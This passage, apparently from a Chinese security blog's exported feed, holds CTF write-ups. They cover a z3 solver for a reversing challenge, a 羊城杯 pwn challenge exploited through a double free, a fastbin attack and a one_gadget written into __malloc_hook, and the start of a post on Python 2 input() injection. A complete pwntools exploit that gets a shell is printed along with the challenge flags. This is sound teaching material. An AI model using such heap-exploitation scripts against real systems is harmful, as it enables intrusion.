class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step1</span>():</span></span><br><span class="line">    a1 = Int(<span class="string">&#x27;a1&#x27;</span>)</span><br><span class="line">    a2 = Int(<span class="string">&#x27;a2&#x27;</span>)</span><br><span class="line">    a3 = Int(<span class="string">&#x27;a3&#x27;</span>)</span><br><span class="line">    a4 = Int(<span class="string">&#x27;a4&#x27;</span>)</span><br><span class="line">    a5 = Int(<span class="string">&#x27;a5&#x27;</span>)</span><br><span class="line">    a6 = Int(<span class="string">&#x27;a6&#x27;</span>)</span><br><span class="line">    a7 = Int(<span class="string">&#x27;a7&#x27;</span>)</span><br><span class="line">    a8 = Int(<span class="string">&#x27;a8&#x27;</span>)</span><br><span class="line">    a9 = Int(<span class="string">&#x27;a9&#x27;</span>)</span><br><span class="line">    a10 = Int(<span class="string">&#x27;a10&#x27;</span>)</span><br><span class="line">    a11 = Int(<span class="string">&#x27;a11&#x27;</span>)</span><br><span class="line">    a12 = Int(<span class="string">&#x27;a12&#x27;</span>)</span><br><span class="line">    a13 = Int(<span class="string">&#x27;a13&#x27;</span>)</span><br><span class="line">    a14 = Int(<span class="string">&#x27;a14&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    solver = Solver()</span><br><span class="line"></span><br><span class="line">    solver.add((((a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span>) + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">    solver.add((((a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span>) + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span>) + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">    solver.add((((a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span>) + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span>) + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span>) + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">    <span class="comment"># True</span></span><br><span class="line">    <span class="comment"># solver.add((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 == 37136) </span></span><br><span class="line">    solver.add(((a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span>) + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>) </span><br><span class="line">    solver.add((((a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span>) + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span>) + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">28</span> == <span class="number">17298</span>) </span><br><span class="line">    solver.add((((a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span>) + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span>) + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span>) + a14 * <span class="number">65</span> == <span class="number">19875</span>) </span><br><span class="line">    solver.add(((a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span>) + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>) </span><br><span class="line">    solver.add((((a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span>) + a14 * <span class="number">27</span> == <span class="number">9710</span>) </span><br><span class="line">    solver.add(((((a1 * <span class="number">67</span> - a2 * <span class="number">68</span>) + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span>) + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span>) + a14 * <span class="number">31</span> == <span class="number">13376</span>) </span><br><span class="line">    solver.add((((a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span>) + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span>) + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span>) + a14 * <span class="number">78</span> == <span class="number">24065</span>) </span><br><span class="line">    solver.add((((a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span>) + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">20</span> == <span class="number">27687</span>) </span><br><span class="line">    solver.add(((a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span>) + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>) </span><br><span class="line">    solver.add(((a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(a1 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a2 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a3 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a4 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a5 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a6 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a7 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a8 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a9 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a10 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a11 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a12 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a13 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a14 &gt;= <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solver.add(a1 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a1 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a2 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a2 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a3 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a3 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a4 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a4 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a5 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a5&gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a6 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a6 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a7 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a7 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a8 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a8 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a9 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a9 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a10 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a10 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a11 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a11 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a12 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a12 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a13 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a13 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a14 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a14 &gt;= 32)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        print(<span class="string">&quot;solver&quot;</span>)</span><br><span class="line">        ans = solver.model()</span><br><span class="line">        print(ans)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;no&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step2</span>():</span></span><br><span class="line">    a1 = <span class="number">119</span></span><br><span class="line">    a2 = <span class="number">24</span></span><br><span class="line">    a3 = <span class="number">10</span></span><br><span class="line">    a4 = <span class="number">7</span></span><br><span class="line">    a5 = <span class="number">104</span></span><br><span class="line">    a6 = <span class="number">43</span></span><br><span class="line">    a7 = <span class="number">28</span></span><br><span class="line">    a8 = <span class="number">91</span></span><br><span class="line">    a9 = <span class="number">52</span></span><br><span class="line">    a10 = <span class="number">108</span></span><br><span class="line">    a11 = <span class="number">88</span></span><br><span class="line">    a12 = <span class="number">74</span></span><br><span class="line">    a13 = <span class="number">88</span><span class="comment">#121</span></span><br><span class="line">    a14 = <span class="number">33</span></span><br><span class="line"></span><br><span class="line">    code = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line">    code[<span class="number">0</span>] = a3</span><br><span class="line">    code[<span class="number">1</span>] = a2</span><br><span class="line">    code[<span class="number">2</span>] = a1</span><br><span class="line">    code[<span class="number">3</span>] = a4</span><br><span class="line">    code[<span class="number">4</span>] = a5</span><br><span class="line">    code[<span class="number">5</span>] = a6</span><br><span class="line">    code[<span class="number">6</span>] = a7</span><br><span class="line">    code[<span class="number">7</span>] = a8</span><br><span class="line">    code[<span class="number">9</span>] = a9</span><br><span class="line">    code[<span class="number">8</span>] = a10</span><br><span class="line">    code[<span class="number">10</span>] = a11</span><br><span class="line">    code[<span class="number">11</span>] = a12</span><br><span class="line">    code[<span class="number">12</span>] = a13</span><br><span class="line">    code[<span class="number">13</span>] = a14</span><br><span class="line"></span><br><span class="line">    flag = []</span><br><span class="line">    flag.append(<span class="built_in">chr</span>(code[<span class="number">13</span>]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">13</span>))[::-<span class="number">1</span>]:</span><br><span class="line">        code[i] = (code[i] ^ code[i + <span class="number">1</span>])</span><br><span class="line">    <span class="comment"># print(&#x27;&#x27;.join(flag[::-1]))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">        print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment"># step1()</span></span><br><span class="line">    step2()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">58964088b637e50d3a22b9510c1d1ef8</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>程序是一个堆管理器，有增删查功能。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>释放堆时，没有将指针置零，也没有对堆管理结构体的 inuse 标志位进行检查再释放，造成了 double free 漏洞。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol><li>double free 泄露 unsorted bin 中 chunk 的 指针。</li><li>fastbin attach 想 hook 函数写入 onegadget</li></ol><p>一开始卡第一步泄露了，想着利用 double free 控制堆管理结构体的指针指向 unsorted bin 的 chunk ，指来指去搞不了。</p><p>最后泄露方法是申请一个比较大的 unsorted bin chunk ，释放后放入 bin 中。再申请一个大小合适的 chunk ，比如 unsorted bin 申请大小为 0x80 ，那么再申请一个大小为 0x50 chunk 加上结构体 0x20 ，申请的时候只写入最低一个字节，破坏一字节还是能算出 libc 地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x80+0x10 &#x3D; 0x50+0x10 + 0x20+0x10</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x &#x2F;20gx 0x555555757030</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757040:0x00000000000000010x0000555555757070</span><br><span class="line">0x555555757050:0x00000000000000620x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x0000000000000061</span><br><span class="line">0x555555757070:0x00007ffff7dd1b610x00007ffff7dd1b78</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570c0:0x00000000000000600x0000000000000031</span><br></pre></td></tr></table></figure><p>后面就是教科书的 fastbin attack 方式了，没有修改功能就在申请 chunk 的时候将 malloc - 0x23 写入，修改 fd 指针，并绕过 fastbin 检查。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./sign_in&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./sign_in&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;183.129.189.60&#x27;</span>,<span class="number">10029</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name,msg</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;game&#x27;s name: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;game&#x27;s name:\n&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(name))</span><br><span class="line">p.recvuntil(<span class="string">&quot;game&#x27;s message:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;game&#x27;s index:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak unsorted bin fd</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;[2]&#x27;s name :&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libcbase=leak_addr-<span class="number">0x3c4b61</span><span class="comment">#0x7ffff7dd1b61-0x00007ffff7a0d000</span></span><br><span class="line">malloc=libcbase+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc:&quot;</span>+<span class="built_in">hex</span>(malloc))</span><br><span class="line">onegadget=libcbase+<span class="number">0xf1207</span><span class="comment"># 0x4527a</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free fastbin</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack &amp; bypass fastbin check</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(malloc-<span class="number">0x23</span>),<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;skye&#x27;</span>.ljust(<span class="number">0x13</span>,<span class="string">&#x27;a&#x27;</span>)+p64(onegadget),<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a48bv8fad44bca4d76765e4590fb351e</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 羊城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python2中input()函数漏洞</title>
      <link href="archives/c5d6b07d/"/>
      <url>archives/c5d6b07d/</url>
      
        <content type="html"><![CDATA[<h2 id="函数简介"><a href="#函数简介" class="headerlink" title="函数简介"></a>函数简介</h2><p><strong>input()函数是python中的内置函数,函数作用是从stdin中读取数据</strong></p><h2 id="input-与-raw-input-区别"><a href="#input-与-raw-input-区别" class="headerlink" title="input() 与 raw_input() 区别"></a>input() 与 raw_input() 区别</h2><p>python2 两个常见输入函数：input 和 raw_input 。</p><p>raw_input() 会将输入的内容转换为字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a1 = raw_input(<span class="string">&quot;字符串:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a1)</span><br><span class="line"></span><br><span class="line">a2 = raw_input(<span class="string">&quot;数字:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a2)</span><br><span class="line"></span><br><span class="line">a3 = raw_input(<span class="string">&quot;变量名:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a3)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">$ python 1.py</span></span><br><span class="line"><span class="string">字符串:skye</span></span><br><span class="line"><span class="string">&lt;type &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">数字:2311</span></span><br><span class="line"><span class="string">&lt;type &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">变量名:a3</span></span><br><span class="line"><span class="string">&lt;type &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>input() 能自动识别出输入的类型，将输入内容转换为对应类型（str、int、float）。这里我们先尝试输入正常无误的例子，注意字符串的输入方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a1 = <span class="built_in">input</span>(<span class="string">&quot;字符串:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a1)</span><br><span class="line"></span><br><span class="line">a2 = <span class="built_in">input</span>(<span class="string">&quot;数字:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">$ python 1.py</span></span><br><span class="line"><span class="string">字符串:&quot;skye&quot;</span></span><br><span class="line"><span class="string">&lt;type &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">数字:2311</span></span><br><span class="line"><span class="string">&lt;type &#x27;int&#x27;&gt;</span></span><br><span class="line"><span 